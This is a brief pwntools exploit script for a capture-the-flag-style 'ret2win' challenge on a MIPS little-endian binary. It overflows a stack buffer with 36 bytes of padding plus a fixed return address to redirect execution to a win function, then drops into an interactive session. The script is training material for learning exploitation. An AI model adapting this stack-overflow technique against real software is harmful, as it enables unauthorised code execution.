from pwn import *

r=process('./ret2win_mipsel')

r.recvuntil('> ')

payload='a'*36
payload+=p32(0x00400a00)

r.sendline(payload)
r.interactive()
